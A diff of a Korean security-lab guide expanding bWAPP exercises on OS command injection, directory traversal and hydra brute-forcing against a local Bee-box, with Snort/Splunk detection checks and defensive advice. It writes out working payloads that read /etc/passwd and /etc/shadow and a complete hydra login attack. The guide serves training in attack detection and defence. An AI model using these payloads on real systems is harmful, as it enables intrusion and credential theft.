@@ -366,47 +366,195 @@ ET WEB_SERVER Script tag in URI Possible Cross Site Scripting Attempt
 
 ### E-5. OS Command Injection
 
-**bWAPP 메뉴:** OS Command Injection
+**bWAPP 메뉴:** OS Command Injection (`commandi.php`)
+
+> **원리:** 웹앱이 사용자 입력을 `shell_exec("nslookup " . $input)` 처럼 OS 명령에 직접 연결할 때,
+> 셸 메타문자(`;`, `|`, `&&`)를 삽입하면 임의 명령을 실행할 수 있다.
+> SQL Injection이 DB를 장악한다면, Command Injection은 **서버 자체를 장악**하는 공격이다.
+
+**사전 준비:**
+- ✅ Bee-box DNS 설정 완료 (`echo "nameserver 10.0.10.1" | sudo tee /etc/resolv.conf`)
+- nslookup이 빠르게 응답하도록 해둬야 명령 주입 결과를 바로 볼 수 있음
+
+**실습 절차:**
+
+1. att-mint 브라우저에서 bWAPP > `OS Command Injection` 선택 > Hack
+2. DNS lookup 입력란에 아래를 **하나씩** 입력 후 Lookup 클릭:
 
 ```bash
-; whoami
-; cat /etc/passwd
-; ls -la /
-; uname -a
-; netstat -an
+# Step 1: 기본 동작 확인 (정상 요청)
+127.0.0.1
+
+# Step 2: 세미콜론으로 명령 주입 — 서버 사용자 확인
+127.0.0.1; whoami
+# 예상 결과: nslookup 결과 + "www-data" 출력
+
+# Step 3: 시스템 정보 수집
+127.0.0.1; uname -a
+# 예상 결과: Linux bee-box 2.6.x ... (커널 버전)
+
+# Step 4: 민감 파일 읽기 — /etc/passwd
+127.0.0.1; cat /etc/passwd
+# 예상 결과: root:x:0:0:... bee:x:1000:... 등 계정 목록 전체 노출
+
+# Step 5: 네트워크 정보 수집
+127.0.0.1; ifconfig
+# 예상 결과: 서버 IP(10.0.10.50) 등 내부 네트워크 정보
 ```
 
-- Snort 예상 탐지: ET WEB_SERVER Command Injection
-- **사전 준비 완료 (2026-08-05):** Bee-box DNS 미설정으로 nslookup 무한 대기 → `echo "nameserver 10.0.10.1" | sudo tee /etc/resolv.conf` 로 해결
+3. 만약 `;`이 안 먹히면 다른 구분자 시도: `127.0.0.1 | whoami` 또는 `127.0.0.1 && whoami`
 
-**결과:**
-> (실습 후 결과 기록)
+**확인 포인트:**
+- [ ] `whoami` → `www-data` 출력 = 웹서버 권한으로 OS 명령 실행 성공
+- [ ] `cat /etc/passwd` → 계정 목록 노출 = 민감 파일 접근 가능
+- [ ] 캡처: 명령 주입 결과 화면 → `images/E-5-cmdi.png`
+
+**Snort 탐지 확인:**
+- Splunk: `index=pfsense 10.50.50.17` (Last 15 minutes)
+- 예상 시그니처: `ET WEB_SERVER cmd=`, `ET WEB_SERVER /etc/passwd`
+- ⚠️ E-4(Stored XSS)처럼 POST body 경유 시 미탐지 가능성 있음 — 이것도 중요한 발견
+- 캡처: Splunk 결과 → `images/E-5-snort-splunk.png`
+
+**관제/컨설팅 관점:**
+- 위험도: **Critical** — 서버 OS 명령 실행 = 시스템 완전 장악 가능 (리버스쉘, 파일 조작, 권한상승)
+- 방어: 입력값에서 셸 메타문자 제거, `escapeshellarg()` 사용, OS 명령 대신 언어 내장 함수(PHP `gethostbyname()`) 사용
+- 관제 포인트: `/etc/passwd`, `cmd=`, `whoami` 등 OS 명령 키워드가 HTTP 트래픽에 나타나면 즉시 차단
+
+---
 
 ### E-6. Directory Traversal
 
-**bWAPP 메뉴:** Directory Traversal - Files
+**bWAPP 메뉴:** Directory Traversal - Files (`directory_traversal_1.php`)
+
+> **원리:** 웹앱이 파일 경로를 사용자 입력으로 받을 때, `../`(상위 디렉토리 이동)를 반복 삽입하면
+> 웹루트 밖의 시스템 파일을 읽을 수 있다. R-3(nikto)에서 이미 traversal 흔적이 탐지되었고,
+> 여기서는 **수동으로 실제 파일 열람**을 확인한다.
+
+**실습 절차:**
+
+1. att-mint 브라우저에서 bWAPP > `Directory Traversal - Files` 선택 > Hack
+2. 페이지에 파일 선택 드롭다운 또는 URL 파라미터가 보임
+3. **URL 파라미터를 직접 수정**하여 시도:
 
 ```
-../../../etc/passwd
-../../../etc/shadow
+# Step 1: 정상 동작 확인
+페이지의 기본 파일(message.txt 등)을 선택하여 정상 출력 확인
+
+# Step 2: /etc/passwd 열람 시도
+URL의 page 파라미터를 아래로 변경:
+http://10.0.0.254/bWAPP/directory_traversal_1.php?page=../../../etc/passwd
+
+# Step 3: 깊이 조절 (안 되면 ../ 추가)
+?page=../../../../etc/passwd
+?page=../../../../../etc/passwd
+
+# Step 4: /etc/shadow 시도 (권한 필요 — 실패할 수도 있음)
+?page=../../../etc/shadow
 ```
 
-**결과:**
-> (실습 후 결과 기록)
+**확인 포인트:**
+- [ ] `/etc/passwd` 내용이 브라우저에 표시됨 = Directory Traversal 성공
+- [ ] `/etc/shadow` 는 권한 문제로 실패할 가능성 높음 (www-data 권한) — 실패해도 정상
+- [ ] 캡처: passwd 열람 결과 → `images/E-6-traversal.png`
+
+**Snort 탐지 확인:**
+- Splunk: `index=pfsense 10.50.50.17` (Last 15 minutes)
+- 예상 시그니처:
+  ```
+  ET WEB_SERVER /etc/passwd Detected in URI
+  (http_inspect) WEBROOT DIRECTORY TRAVERSAL
+  ```
+- R-3(nikto)에서 이미 같은 룰이 탐지된 바 있음 — 수동 시도에서도 동일하게 탐지될 것
+- 캡처: Splunk 결과 → `images/E-6-snort-splunk.png`
+
+**관제/컨설팅 관점:**
+- 위험도: **High** — 시스템 설정파일·소스코드·비밀키 유출 가능
+- 방어: 파일 경로 입력 시 `../` 필터링, `realpath()` + 화이트리스트 기반 경로 검증, `open_basedir` 설정
+- 관제 포인트: URI에 `../`, `/etc/passwd`, `/etc/shadow` 등이 포함되면 즉시 경보 → IPS 룰이 잘 탐지하는 영역
+
+---
 
 ### E-7. Brute Force (hydra)
 
-```bash
-# 워드리스트 생성
-echo -e "admin\npassword\n123456\nbee\nbug\ntest\nroot" > wordlist.txt
+**bWAPP 메뉴:** 직접 사용하지 않음 — bWAPP 로그인 페이지(`login.php`)를 대상으로 hydra 실행
 
-# HTTP POST 브루트포스
-hydra -l bee -P wordlist.txt 10.0.0.254 \
-  http-post-form "/bWAPP/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid"
+> **원리:** 로그인 폼에 사전(wordlist)의 비밀번호를 자동으로 대입하여 계정을 탈취한다.
+> E-2(sqlmap)에서 이미 해시를 크랙했지만, 브루트포스는 **해시 없이도 계정을 탈취**할 수 있고,
+> 관제 관점에서 반복 로그인 시도 탐지가 중요한 시나리오다.
+
+**실습 절차:**
+
+1. att-mint 터미널에서 실행:
+
+```bash
+# Step 1: 워드리스트 생성
+cat > wordlist.txt << 'EOF'
+admin
+password
+123456
+bee
+bug
+test
+root
+letmein
+bwapp
+1234
+EOF
 ```
 
-**결과:**
-> (실습 후 결과 기록)
+2. 로그인 실패 시 응답에 포함되는 **실패 문자열 확인** (hydra가 성공/실패를 구분하는 기준):
+
+```bash
+# 틀린 비밀번호로 로그인 시도하여 실패 메시지 확인
+curl -s -d "login=bee&password=wrong&security_level=0&form=submit" \
+  http://10.0.0.254/bWAPP/login.php | grep -i "invalid\|error\|wrong"
+# "Invalid credentials" 같은 문자열이 나오면 그걸 hydra -F 조건에 사용
+```
+
+3. hydra 브루트포스 실행:
+
+```bash
+# Step 2: hydra 실행 (HTTP POST form)
+hydra -l bee -P wordlist.txt 10.0.0.254 \
+  http-post-form "/bWAPP/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid" \
+  -V -t 4
+
+# 옵션 설명:
+#   -l bee         : 사용자명 고정 (bee)
+#   -P wordlist.txt: 비밀번호 사전
+#   http-post-form : HTTP POST 방식 로그인
+#   :Invalid       : 이 문자열이 응답에 있으면 실패로 판단
+#   -V             : 각 시도를 출력 (verbose)
+#   -t 4           : 동시 4스레드
+```
+
+4. 예상 결과: `[80][http-post-form] host: 10.0.0.254   login: bee   password: bug`
+
+**⚠️ 실패 문자열 주의:**
+- `Invalid`가 안 맞으면 hydra가 모든 비밀번호를 "성공"으로 판단함
+- Step 2에서 실제 실패 응답을 확인한 후 정확한 문자열을 사용할 것
+- bWAPP 버전에 따라 `Invalid credentials`, `invalid`, `not correct` 등 다를 수 있음
+
+**확인 포인트:**
+- [ ] hydra가 `bee`/`bug` 조합을 찾아냄 = 브루트포스 성공
+- [ ] E-2에서 크랙한 비밀번호(bug)와 일치 확인
+- [ ] 캡처: hydra 실행 결과 → `images/E-7-hydra.png`
+
+**Snort 탐지 확인:**
+- Splunk: `index=pfsense 10.50.50.17` (Last 15 minutes)
+- 예상 시그니처:
+  ```
+  ET SCAN Hydra User-Agent Detected          ← hydra 도구 식별
+  ET WEB_SERVER Brute Force Login Attempt     ← 반복 로그인 시도
+  ```
+- sqlmap(E-2)처럼 자동화 도구는 User-Agent로 식별되므로 탐지 가능성 높음
+- 단, 적은 횟수(10회)로는 rate-based 룰에 안 걸릴 수 있음
+- 캡처: Splunk 결과 → `images/E-7-snort-splunk.png`
+
+**관제/컨설팅 관점:**
+- 위험도: **High** — 약한 비밀번호 사용 시 계정 탈취
+- 방어: 계정 잠금(N회 실패 시 잠금), CAPTCHA, 로그인 rate-limit, 강한 비밀번호 정책
+- 관제 포인트: 동일 IP에서 짧은 시간에 다수 로그인 시도 = 브루트포스 징후 → 자동 차단 트리거
 
 ---
 
